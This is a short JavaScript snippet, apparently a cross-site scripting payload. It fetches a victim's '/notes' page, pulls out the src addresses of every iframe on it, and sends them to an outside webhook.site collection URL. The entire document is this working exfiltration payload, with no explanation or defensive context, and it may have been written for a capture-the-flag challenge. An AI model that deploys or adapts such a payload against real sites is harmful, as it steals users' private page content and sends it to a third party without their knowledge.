fetch('/notes', {mode: 'no-cors'}).then(r=>r.text()).then(d=>{
  let doc = (new DOMParser()).parseFromString(d, 'text/html');
  let iframes = doc.querySelectorAll('iframe');
  let sources = Array.from(iframes).map(iframe => iframe.getAttribute('src')).join(',');
  fetch('https://webhook.site/6468aa73-bdef-4ec4-b802-e0d5084b9da6?data='+encodeURIComponent(sources), {
    method: 'GET',
    mode: 'no-cors'
  });
})
